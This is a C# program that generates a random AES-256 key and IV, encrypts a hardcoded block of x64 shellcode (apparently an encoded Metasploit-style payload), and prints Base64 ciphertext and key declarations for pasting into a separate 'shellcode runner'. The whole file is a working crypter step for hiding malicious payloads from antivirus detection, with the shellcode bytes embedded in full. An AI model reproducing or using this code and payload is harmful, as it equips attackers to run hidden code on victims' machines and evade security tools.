using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace AES
{
    class Program
    {
        public static byte[] Encrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            Aes main_aes = Aes.Create();

            //Parse key
            StringBuilder hex_key = new StringBuilder(main_aes.KeySize * 2);
            hex_key.Append("byte[] key = new byte[");
            hex_key.Append(main_aes.Key.Length);
            hex_key.Append("] { ");
            foreach (byte b in main_aes.Key)
            {
                hex_key.AppendFormat("0x{0:x2}, ", b);
            }
            hex_key.Remove(hex_key.Length - 2, 1);
            hex_key.Append("};");
            

            //Parse IV
            StringBuilder hex_iv = new StringBuilder(main_aes.IV.Length * 2);
            hex_iv.Append("byte[] iv = new byte[");
            hex_iv.Append(main_aes.IV.Length);
            hex_iv.Append("] { ");
            foreach (byte b in main_aes.IV)
            {
                hex_iv.AppendFormat("0x{0:x2}, ", b);
            }
            hex_iv.Remove(hex_iv.Length - 2, 1);
            hex_iv.Append("};");



            /* length: 927 bytes */
            byte[] buf = new byte[655] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xb3,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xd3,0x5b,0x76,0x9a,0x60,0xeb,0x16,0xa5,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x2f,0x13,0xf5,0x7e,0x90,0x03,
0xda,0xa5,0xd3,0x5b,0x37,0xcb,0x21,0xbb,0x44,0xed,0xe2,0x89,0x27,0xff,0x28,
0x60,0x44,0xc5,0x9b,0xd0,0x24,0x82,0x28,0x60,0x44,0x85,0x85,0x13,0x79,0x2d,
0x2a,0xa1,0x5b,0x94,0x1a,0x13,0xfd,0xe8,0x30,0xa3,0x27,0x65,0x7f,0x67,0x17,
0xe6,0x62,0xc7,0x36,0xe4,0x12,0x92,0x7b,0xdb,0x61,0x2a,0xf4,0x48,0x81,0x1a,
0x27,0xd2,0xeb,0xb9,0x36,0x2e,0x91,0x67,0x3e,0x9b,0xb0,0x8d,0x97,0xdd,0xcb,
0x50,0x74,0x95,0xe5,0x99,0x16,0xa5,0xd3,0xd0,0xf6,0x12,0x60,0xeb,0x16,0xed,
0x56,0x9b,0x02,0xfd,0x28,0xea,0xc6,0x2e,0x9b,0x43,0x32,0x11,0x20,0xcb,0x5f,
0xa4,0x03,0x0b,0x95,0xcc,0x2d,0xda,0xdf,0xed,0x2c,0x92,0x37,0x11,0x54,0x63,
0x5e,0xa4,0x05,0x13,0x47,0x5a,0x21,0x2a,0xdf,0xa8,0x7f,0x1a,0x77,0x5b,0x58,
0x0b,0x63,0x54,0x9f,0x58,0x3a,0xbe,0x68,0xae,0x2f,0x74,0xa6,0x83,0x2e,0xde,
0xeb,0xab,0x32,0xec,0xd2,0x8b,0x10,0xdb,0xeb,0xe7,0x5e,0xe1,0x58,0x1b,0x6a,
0xd3,0x61,0x3b,0x57,0x2e,0xd7,0xd3,0x37,0xc2,0x21,0xb3,0x5e,0xa4,0x03,0x05,
0x2f,0xc0,0x21,0xb3,0x57,0xfc,0x92,0x01,0x3e,0x19,0x8c,0xcb,0x57,0xf7,0x2c,
0xbb,0x2e,0xdb,0x39,0xb1,0x5e,0x2e,0xc1,0xb2,0x3d,0x65,0x9f,0x14,0x4b,0xed,
0xe2,0x80,0x25,0xd3,0xde,0x9c,0x7f,0xcb,0xba,0x35,0x13,0xee,0x60,0xaa,0x40,
0xed,0x5a,0xba,0x3f,0x5d,0xa2,0xa7,0x61,0x83,0xd4,0xa4,0xa3,0xc9,0x33,0xa3,
0x9f,0x44,0x80,0x01,0x3b,0xab,0xa0,0xa6,0x27,0x6c,0x80,0x08,0x3f,0x20,0x5a,
0xbd,0x6f,0x02,0xd3,0x5b,0x76,0x9a,0x9f,0x3e,0xfe,0xab,0xd3,0x5b,0x76,0xab,
0x59,0xd9,0x38,0x94,0xe5,0x63,0x58,0xab,0x50,0xc5,0x20,0x96,0xd3,0x01,0x3e,
0x13,0xa1,0xa2,0xd1,0x65,0x68,0x5a,0x76,0x9a,0x2d,0xda,0xdf,0xf6,0x80,0x31,
0x75,0xc9,0x29,0x51,0x41,0x2c,0x4c,0x9d,0x76,0x9a,0x60,0xeb,0xe9,0x70,0x3b,
0x62,0x76,0x9a,0x60,0xc4,0x25,0xf6,0xa7,0x23,0x29,0xe2,0x33,0xb3,0x70,0xc7,
0x81,0x2f,0x24,0xdd,0x18,0xac,0x52,0xe6,0xb8,0x2b,0x13,0xdb,0x26,0x89,0x59,
0xdd,0xa2,0x69,0x29,0xcb,0x0d,0xa7,0x2e,0x91,0x96,0x33,0x26,0xc5,0x22,0x80,
0x20,0xe7,0xa2,0x10,0x1f,0xcd,0x10,0x91,0x66,0xe3,0x86,0x2c,0x06,0xcc,0x04,
0xeb,0x5e,0x2c,0x12,0x08,0x2c,0xdb,0x38,0xa6,0x27,0x6c,0x80,0x13,0xce,0x9a,
0x52,0x43,0x92,0xa5,0xd3,0x5b,0x76,0xca,0x33,0xb8,0x5f,0x62,0x11,0xb0,0x23,
0xb4,0x5b,0x14,0xc3,0xed,0x5a,0x9d,0x1c,0x90,0x3f,0xa3,0x9f,0x54,0xb9,0x44,
0x2c,0xc8,0x08,0x6b,0x25,0xa5,0xd3,0x12,0xff,0x7a,0x0a,0xef,0x57,0xfc,0x9a,
0xe1,0x03,0xdc,0xfe,0x6d,0x16,0xa5,0xd3,0x5b,0x89,0x4f,0x2d,0xda,0xd6,0xf6,
0x89,0x13,0xff,0x6b,0x2d,0xda,0xdf,0xe8,0xe2,0x92,0x25,0xc9,0x29,0x2c,0xd4,
0x88,0xd5,0x43,0x0d,0x65,0xb5,0x6e,0xd6,0xd0,0xcc,0x13,0xb1,0x5b,0xe8,0xf8,
0x16,0xa5,0x9a,0xe1,0x32,0x6a,0x55,0x0b,0x16,0xa5,0xd3,0x5b,0x89,0x4f,0x28,
0x14,0xd9,0xd1,0xd1,0xb0,0xdc,0x72,0x35,0xeb,0x16,0xa5,0x80,0x02,0x1c,0xda,
0x3a,0xa2,0x9f,0x74,0x12,0xb9,0x66,0xd3,0xa7,0x2b,0x16,0xb5,0xd3,0x5b,0x3f,
0x20,0x38,0x4f,0x45,0x40,0xd3,0x5b,0x76,0x9a,0x9f,0x3e,0x5e,0x36,0x80,0x08,
0x3e,0x13,0x87,0xa3,0x9f,0x54,0x9b,0xd2,0xac,0xd3,0xa7,0x2b,0x16,0x85,0xd3,
0x5b,0x3f,0x13,0x99,0xa2,0xac,0xb7,0x45,0xd2,0x94,0x9a,0x60,0xeb,0x16,0x5a,
0x06,0x13,0xf5,0x5e,0x40,0x6e,0xd6,0xd1,0x61,0x3d,0xfd,0x9d,0x28,0xea,0xd5,
0x20,0x13,0x2e,0xa4,0xc2,0xa3,0xb3,0x7c,0xa5,0x8a,0x12,0xb1,0x58,0x90,0x5e,
0xb4,0xf3,0x2c,0x8e,0x76,0x9a,0x60,0xeb,0x16,0xa5 };

            // Encrypt and Encode the data:
            byte[] encrypted_data = Encrypt(buf, main_aes.Key, main_aes.IV);

            /*Show that shellcode has been encrypted successfully
            StringBuilder encrypting_data = new StringBuilder(buf.Length * 2);
            foreach (byte b in encrypted_data)
            {
                encrypting_data.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("[*] Encrypted Data: " + encrypting_data.ToString() + "\n");
            */


            //Generate final payload that will be used in actual shellcode runner
            string finalPayload = Convert.ToBase64String(encrypted_data);
            Console.WriteLine("[*] Final Payload:");
            Console.WriteLine("string finalPayload = \"" + finalPayload + "\";");
            Console.WriteLine(hex_key.ToString());
            Console.WriteLine(hex_iv.ToString());


            /*AES Decryptor
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), main_aes.Key, main_aes.IV);

            //Show that shellcode has been decrypted successfully
            StringBuilder decrypting_data = new StringBuilder(decrypted_data.Length * 2);
            foreach (byte b in decrypted_data)
            {
                decrypting_data.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("Decrypted Data: " + decrypting_data.ToString() + "\n\n\n\n");
            */
        }
    }
}